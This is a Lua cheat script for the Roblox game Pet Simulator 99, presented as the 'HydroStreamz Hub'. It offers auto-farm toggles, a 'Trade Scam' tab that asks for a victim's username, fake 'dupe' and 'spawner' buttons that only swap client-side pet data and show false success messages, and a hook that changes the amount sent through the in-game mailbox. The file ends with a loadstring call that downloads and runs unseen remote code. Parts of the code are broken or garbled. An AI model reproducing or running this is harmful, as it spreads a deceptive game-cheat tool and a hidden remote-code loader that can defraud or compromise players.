local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({
    Name = "HydroStreamz Hub🌀",
    HidePremium = true,
    SaveConfig = true,
    ConfigFolder = "HydroStreamz",
    IntroEnabled = true,  -- Panatilihing totoong ang IntroEnabled kung nais mong magkaroon ng intro.
    IntroText = "Welcome to HydroStreamz Hub Script!"  -- Palitan ang IntroText ayon sa iyong gusto.
})

-- Ang natitirang bahagi ng iyong code ay dito na nasusunod...

--[[
Name = <ScriptSavvyHUB> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]
local Tab = Window:MakeTab({
		Name = "Information",
		Icon = "rbxassetid://17586572991",
		PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("REGARDING HUB","My HYDROSTREAMZ HUB in Pet Simulator 99 is a potent script that enriches your gaming experience by providing essential features for seamless gameplay")
local Section = Tab:AddSection({
	Name = "Platform"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddParagraph("Support Me","By Subscribing My YouTube Channel")
local Tab = Window:MakeTab({
	Name = "AutoFarm",
	Icon = "rbxassetid://17586593789",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
local Section = Tab:AddSection({
	Name = "Features"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Auto Area",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Tab:AddToggle({
	Name = "Auto Rank",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Tab:AddToggle({
	Name = "Auto Farm Coin",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Auto Farm Gems",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
local Section = Tab:AddSection({
	Name = "More Features"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Auto Shiny Relic",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
local Tab = Window:MakeTab({
	Name = "Mail Duping",
	Icon = "rbxassetid://17586608031",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Guide","Ensure that you have two distinct accounts, and run this script on the account containing pets (exclusive or huge pets only). Once you've entered the alternate username, click 'Start Duping' and patiently wait for 30 seconds")
Tab:AddParagraph("Caution","It only functions for huge, exclusive, and gems")
Tab:AddTextbox({
	Name = "Username",
	Default = "Type Username!",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
Tab:AddButton({
	Name = "Start Duping",
	Callback = function()
					print("Tap Button")
		end    
})
local Tab = Window:MakeTab({
	Name = "Trade Scam",
	Icon = "rbxassetid://17316268316",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Guide","To make this work, initiate a trade with another player and ensure to input their username. Once you've entered their username, activate the 'Freeze Lag' and 'Activate' simultaneouly")
Tab:AddTextbox({
	Name = "Victim Username",
	Default = "Type Username",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
Tab:AddToggle({
	Name = "Freezing Trade",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Tab:AddToggle({
	Name = "Launch",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
local Tab = Window:MakeTab({
	Name = "Hatch Egg",
	Icon = "rbxassetid://17586625014",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Caution","Ensure you have an adequate amount of coins")
Tab:AddParagraph("Guide","Start by incubating the egg, then unleash its potential with the 'Fast Hatch' toggle")
Tab:AddToggle({
	Name = "Fast Hatching",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Tab:AddToggle({
	Name = "Auto Hatch",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Tab:AddToggle({
	Name = "Remove Egg Animation",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})
local Tab = Window:MakeTab({
	Name = "MiniGames",
	Icon = "rbxassetid://17586648839",
	PremiumOnly = false
})
Tab:AddParagraph("Guide","Ensure to enter the area before activating it")
local Section = Tab:AddSection({
	Name = "Fishing"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Fast Fishing",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})
local Section = Tab:AddSection({
	Name = "Digging"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Fast Digging",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
local Tab = Window:MakeTab({
	Name = "Glitch Item",
	Icon = "rbxassetid://17586674425",
	PremiumOnly = false
})
Tab:AddParagraph("Guide","You must input the name of the item. After entering its name, toggle 'DUPE' and wait for 30 seconds")
Tab:AddTextbox({
	Name = "Glitch Item",
	Default = "Glitch Item",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})
Tab:AddToggle({
	Name = "Start Duping",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})
local Tab = Window:MakeTab({
	Name = "Duping Huge",
	Icon = "rbxassetid://17586693431",
	PremiumOnly = false
})
Tab:AddParagraph("Guide","This will only work with huges, so if you encounter any bugs, ensure you have huges. If it doesn't work, create a ticket in my Discord server.")
Tab:AddTextbox({
	Name = "Dupe Amount",
	Default = "Type Amount",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})
Tab:AddButton({
	Name = "Start Duping",
	Callback = function()
			-- Ensure you have a BoolValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
		toggle = Instance.new("BoolValue")
		toggle.Name = "ToggleState"
		toggle.Value = false
		toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
		local lib = require(game.ReplicatedStorage.Library)
		for i, v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
		end
		for i, v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
		end
end

-- First set of pet swaps
local function executeFirstSet()
		swapPets("Cat", "Huge Sun Agony")
		swapPets("Corgi", "Huge Sun Agony")			swapPets("Butterfly", "Huge Sun Agony")
		swapPets("Bunny", "Huge Sun Agony")
		swapPets("Axolotl", "Huge Sun Agony")
		swapPets("Dalmatian", "Huge Sun Agony")
		swapPets("Chick", "Huge Sun Agony")
		swapPets("Ducky", "Huge Sun Agony")
		swapPets("Cow",
"Huge Sun Agony")
		swapPets("Chicken",
"Huge Sun Agony")
		swapPets("Elephant", "Huge Sun Agony")
end

-- Second set of pet swaps
local function executeSecondSet()
		swapPets("Cow", "Huge White Balloon Cat")
		swapPets("Flamingo", "Huge White Balloon Cat")
		swapPets("Ladybug", "Huge White Balloon Cat")
		swapPets("Ugly Duckling", "Huge White Balloon Cat")
		swapPets("Froggy", "Huge White Balloon Cat")
		swapPets("Umbrella Dog", "Huge White Balloon Cat")
		swapPets("Umbrella Cat", "Huge White Balloon Cat")
		swapPets("Platypus", "Huge White Balloon Cat")
		swapPets("Firefly", "Huge White Balloon Cat")
		swapPets("Dragon", "Huge White Balloon Cat")
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == false then
		-- First set of pets
		executeFirstSet()
		toggle.Value = true
else
		-- Second set of pets
		executeSecondSet()
		toggle.Value = false
			end

			wait(5)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("DUPE SUCCESSFULLY!!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Duping Titanic",
	Icon = "rbxassetid://17586710404",
	PremiumOnly = false
})
Tab:AddParagraph("Guide","This will only work If ypu have Titanic, so if you encounter any bugs, ensure you have TITANIC. If it doesn't work, create a ticket in my Discord server")

Tab:AddButton({
	Name = "Start Duping",
	Callback = function()
			-- Ensure you have a BooleanValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
		toggle = Instance.new("BoolValue")
		toggle.Name = "ToggleState"
		toggle.Value = false
		toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
		local lib = require(game.ReplicatedStorage.Library)
		for i, v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
		end
		for i, v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
		end
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == false then
		-- First set of pets
		swapPets("Cat", "Titanic Bejeweled Griffin")
		toggle.Value = true
else
		-- Second set of pets
		swapPets("Corgi", "Titanic Bejeweled Griffin")
		toggle.Value = false
			end

			wait(5)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("TITANIC DUPE SUCCESSFULLY!!!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Duping Exclusive",
	Icon = "rbxassetid://17726367164",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","Make Sure You Type The Name Of Huge Correctly")

Tab:AddTextbox({
	Name = "Name Of Exclusive",
	Default = "Type Name",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddParagraph("Amount","")

Tab:AddTextbox({
	Name = "Amount",
	Default = "Type Amount",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddButton({
	Name = "Start Duping",
	Callback = function()
			-- Ensure you have a BoolValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
		toggle = Instance.new("BoolValue")
		toggle.Name = "ToggleState"
		toggle.Value = false
		toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
		local lib = require(game.ReplicatedStorage.Library)
		for i, v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
		end
		for i, v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
		end
end

-- First set of pet swaps
local function executeFirstSet()
		swapPets("Cat", "Wicked Empyrean Dragon")
		swapPets("Corgi", "Wicked Empyrean Dragon") swapPets("Butterfly", "Wicked Empyrean Dragon")
		swapPets("Bunny", "Wicked Empyrean Dragon")
		swapPets("Axolotl", "Wicked Empyrean Dragon")
		swapPets("Dalmatian", "Wicked Empyrean Dragon")
		swapPets("Chick", "Wicked Empyrean Dragon")
		swapPets("Ducky", "Wicked Empyrean Dragon")
		swapPets("Cow",
"Wicked Empyrean Dragon")
		swapPets("Chicken",
"Wicked Empyrean Dragon")
		swapPets("Cow", "Wicked Empyrean Dragon")
		swapPets("Flamingo", "Wicked Empyrean Dragon")
		swapPets("Ladybug", "Wicked Empyrean Dragon")
		swapPets("Ugly Duckling", "Wicked Empyrean Dragon")
		swapPets("Froggy", "Wicked Empyrean Dragon")
		swapPets("Umbrella Dog", "Wicked Empyrean Dragon")
		swapPets("Umbrella Cat", "Wicked Empyrean Dragon")
	  swapPets("Platypus", "Wicked Empyrean Dragon")
		swapPets("Firefly", "Wicked Empyrean Dragon")
		swapPets("Dragon", "Wicked Empyrean Dragon")
		swapPets("Elephant", "Wicked Empyrean Dragon")
end

-- Second set of pet swaps
local function executeSecondSet()
		swapPets("Cow", "Huge White Balloon Cat")
		swapPets("Flamingo", "Huge White Balloon Cat")
		swapPets("Ladybug", "Huge White Balloon Cat")
		swapPets("Ugly Duckling", "Huge White Balloon Cat")
		swapPets("Froggy", "Huge White Balloon Cat")
		swapPets("Umbrella Dog", "Huge White Balloon Cat")
		swapPets("Umbrella Cat", "Huge White Balloon Cat")
		swapPets("Platypus", "Huge White Balloon Cat")
		swapPets("Firefly", "Huge White Balloon Cat")
		swapPets("Dragon", "Huge White Balloon Cat")
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == false then
		-- First set of pets
		executeFirstSet()
		toggle.Value = true
else
		-- Second set of pets
		executeSecondSet()
		toggle.Value = false
			end

			wait(5)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("EXCLUSIVE DUPED SUCCESSFULLY!!")
		end

	})
			
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]

--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Tab = Window:MakeTab({
	Name = "Huge Spawner",
	Icon = "rbxassetid://17586729056",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","Make Sure You Type The Name Of Exclusive Correctly")

Tab:AddTextbox({
	Name = "Name Of Huge",
	Default = "Type Name",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddTextbox({
	Name = "Amount",
	Default = "Type Amount",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddButton({
	Name = "Spawning Start",
	Callback = function()
			-- Ensure you have a BoolValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
		toggle = Instance.new("BoolValue")
		toggle.Name = "ToggleState"
		toggle.Value = false
		toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
		local lib = require(game.ReplicatedStorage.Library)
		for i, v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
		end
		for i, v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
		end
end

-- First set of pet swaps
local function executeFirstSet()
		swapPets("Cat", "Wicked Empyrean Dragon")
	  swapPets("Wicked Empyrean Dragon")
		swapPets("Bunny", "Wicked Empyrean Dragon")
		swapPets("Axolotl", "Wicked Empyrean Dragon")
		swapPets("Dalmatian", "Wicked Empyrean Dragon")
		swapPets("Cow", "Wicked Empyrean Dragon")
		swapPets("Flamingo", "Wicked Empyrean Dragon")
		swapPets("Ladybug", "Wicked Empyrean Dragon")
		swapPets("Ugly Duckling", "Wicked Empyrean Dragon")
		swapPets("Froggy", "Wicked Empyrean Dragon")
		swapPets("Umbrella Dog", "Wicked Empyrean Dragon")
		swapPets("Umbrella Cat", "Wicked Empyrean Dragon")
		swapPets("Platypus", "Wicked Empyrean Dragon")
		swapPets("Dog", "Wicked Empyrean Dragon")
		swapPets("Firefly", "Wicked Empyrean Dragon")
		swapPets("Dragon", "Wicked Empyrean Dragon")
		swapPets("Chick", "Wicked Empyrean Dragon")
		swapPets("Cow", "Wicked Empyrean Dragon")
		swapPets("Chicken",
"Wicked Empyrean Dragon")
		swapPets("Elephant", "Wicked Empyrean Dragon")
end

-- Second set of pet swaps
local function executeSecondSet()
		swapPets("Cow", "Huge Lucky Cat")
		swapPets("Flamingo", "Huge Lucky Cat")
		swapPets("Ladybug", "Huge Lucky Cat")
		swapPets("Ugly Duckling", "Huge Lucky Cat")
		swapPets("Froggy", "Huge Lucky Cat")
		swapPets("Umbrella Dog", "Huge Lucky Cat")
		swapPets("Umbrella Cat", "Huge Lucky Cat")
		swapPets("Platypus", "Huge Lucky Cat")
		swapPets("Dog", "Huge Lucky Cat")
		swapPets("Firefly", "Huge Lucky Cat")
		swapPets("Dragon", "Huge Lucky Cat")
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == false then
		-- First set of pets
		executeFirstSet()
		toggle.Value = true
else
		-- Second set of pets
		executeSecondSet()
		toggle.Value = false
			end

			wait(5)
local message = require(game.ReplicatedStorage.Library.Client.Message)
			message.Error("EXCLUSIVE DUPED SUCCESSFULLY !!!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Titanic Spawner",
	Icon = "rbxassetid://17586741647",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","Make Sure You Type The Name Of Titanic Correctly To Avoid Mistake")

Tab:AddTextbox({
	Name = "Name Of Titanic",
	Default = "Type Name",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddButton({
	Name = "Start Spawning",
	Callback = function()
			-- Ensure you have a BooleanValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
		toggle = Instance.new("BoolValue")
		toggle.Name = "ToggleState"
		toggle.Value = false
		toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
		local lib = require(game.ReplicatedStorage.Library)
		for i, v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
		end
		for i, v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
		end
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == false then
		-- First set of pets
		swapPets("Cat", "Titanic Bejeweled Griffin")
		toggle.Value = true
else
		-- Second set of pets
		swapPets("Corgi", "Titanic Sketch Cat")
		toggle.Value = false
			end

			wait(5)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("TITANIC SPAWN SUCCESSFULLY!!!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Exclusive Egg",
	Icon = "rbxassetid://17586754004",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","Make Sure You Tap Huge Hunting/Titanic Hunting After You Open The Exclusive Egg")

Tab:AddButton({
	Name = "Titanic Hunting",
	Callback = function()
			local lib = require(game.ReplicatedStorage.Library)

local fromPet = "Valentines Cat"
local toPet = "Titanic Lovemelon"

for i,v in pairs(lib.Directory.Pets[fromPet]) do
  lib.Directory.Pets[fromPet][i] = nil
end
for i,v in pairs(lib.Directory.Pets[toPet]) do
  lib.Directory.Pets[fromPet][i] = v
			end

			local lib = require(game.ReplicatedStorage.Library)

local fromPet = "Cupid Corgi"
local toPet = "Titanic Lovemelon"

for i,v in pairs(lib.Directory.Pets[fromPet]) do
  lib.Directory.Pets[fromPet][i] = nil
end
for i,v in pairs(lib.Directory.Pets[toPet]) do
  lib.Directory.Pets[fromPet][i] = v
			end

			local lib = require(game.ReplicatedStorage.Library)

local fromPet = "Heart Balloon Cat"
local toPet = "Titanic Lovemelon"

for i,v in pairs(lib.Directory.Pets[fromPet]) do
  lib.Directory.Pets[fromPet][i] = nil
end
for i,v in pairs(lib.Directory.Pets[toPet]) do
  lib.Directory.Pets[fromPet][i] = v
			end

			wait(1)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("Hunting Starting")
		end

	})

			Tab:AddButton({
	Name = "Huge Hunting",
	Callback = function()
			local lib = require(game.ReplicatedStorage.Library)

			local fromPet = "Tiedye Bunny"
			local toPet = "Huge Tiedye Bunny"

			for i,v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
			end
			for i,v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
						end

			local lib = require(game.ReplicatedStorage.Library)

			local fromPet = "Tiedye Axolotl"
			local toPet = "Huge Tiedye Bunny"

			for i,v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
			end
			for i,v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
			end

			local lib = require(game.ReplicatedStorage.Library)

			local fromPet = "Tiedye Dog"
			local toPet = "Huge Tiedye Bunny"

			for i,v in pairs(lib.Directory.Pets[fromPet]) do
				lib.Directory.Pets[fromPet][i] = nil
			end
			for i,v in pairs(lib.Directory.Pets[toPet]) do
				lib.Directory.Pets[fromPet][i] = v
			end

			local lib = require(game.ReplicatedStorage.Library)

local fromPet = "Tiedye Griffin"
local toPet = "Huge Tiedye Bunny"

for i,v in pairs(lib.Directory.Pets[fromPet]) do
  lib.Directory.Pets[fromPet][i] = nil
end
for i,v in pairs(lib.Directory.Pets[toPet]) do
  lib.Directory.Pets[fromPet][i] = v
			end

			wait(1)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("Hunting Successfully")
		end

	})

local Tab = Window:MakeTab({
	Name = "Pet Changer",
	Icon = "rbxassetid://17586767687",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","Make Sure You Type The Name Of Pet Correctly In FromPet And Topet To avoid mistaken")

Tab:AddTextbox({
	Name = "Local From Pet",
	Default = "Type Name",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddTextbox({
	Name = "Local To Pet",
	Default = "Type Name",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddButton({
	Name = "Start Changing",
	Callback = function()
			-- Ensure you have an IntValue in ReplicatedStorage to keep track of the toggle state
local toggle = game.ReplicatedStorage:FindFirstChild("ToggleState")
if not toggle then
    toggle = Instance.new("IntValue")
    toggle.Name = "ToggleState"
    toggle.Value = 0
    toggle.Parent = game.ReplicatedStorage
end

-- Function to swap pet details
local function swapPets(fromPet, toPet)
    local lib = require(game.ReplicatedStorage.Library)
    for i, v in pairs(lib.Directory.Pets[fromPet]) do
        lib.Directory.Pets[fromPet][i] = nil
    end
    for i, v in pairs(lib.Directory.Pets[toPet]) do
        lib.Directory.Pets[fromPet][i] = v
    end
end

-- Check the toggle state and execute the appropriate block
if toggle.Value == 0 then
    -- First set of pets
    swapPets("Cat", "Titanic Bejeweled Griffin")
    toggle.Value = 1
elseif toggle.Value == 1 then
    -- Second set of pets
    swapPets("Corgi", "Titanic Sketch Cat")
    toggle.Value = 2
elseif toggle.Value == 2 then
    -- Third set of pets
    local lib = require(game.ReplicatedStorage.Library)
    local fromPet = "Dog"
    local toPet = "Huge Atomic Axolotl"

    for i,v in pairs(lib.Directory.Pets[fromPet]) do
        lib.Directory.Pets[fromPet][i] = nil
    end
    for i,v in pairs(lib.Directory.Pets[toPet]) do
        lib.Directory.Pets[fromPet][i] = v
    end
    toggle.Value = 0 -- Reset the counter to cycle back
			end

			wait(2)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("Pet Change Successfully!!!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Gems Duping",
	Icon = "rbxassetid://17586779012",
	PremiumOnly = false
})

Tab:AddParagraph("Guide","Make Sure Yu Type Your Current Gems Correctly")

Tab:AddTextbox({
	Name = "Current Gems",
	Default = "Type Amount",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddButton({
	Name = "Start Duping",
	Callback = function()
			local lib = require(game:GetService("ReplicatedStorage").Library)
local old
old = hookmetamethod(game, "__namecall", function(self, ...)
local args = {...}
    if tostring(self) == "Mailbox: Send" and getnamecallmethod() == "InvokeServer" then
        args[5] = 10000
        print(unpack(args))
    end
return old(self, unpack(args))
end)
			
			local message = require(game.ReplicatedStorage.Library.Client.Message)
message.Error("Gems Successfully Dupe!!!")
		end

	})

local Tab = Window:MakeTab({
	Name = "Misc",
	Icon = "rbxassetid://17586795822",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddButton({
	Name = "FPS Booster",
	Callback = function()
		end

	})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab:AddButton({
	Name = "Server Hop",
	Callback = function()
		end

	})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab:AddTextbox({
	Name = "Webhook",
	Default = "Put it here",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})
OrionLib:Init()
--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the el after losing focus.lÃ 
1
= <function> - The function of the textbox.
]]

loadstring(game:HttpGet("https://raw.githubusercontent.com/HydroStreamzOfficial/Abi/main/Hev"))()
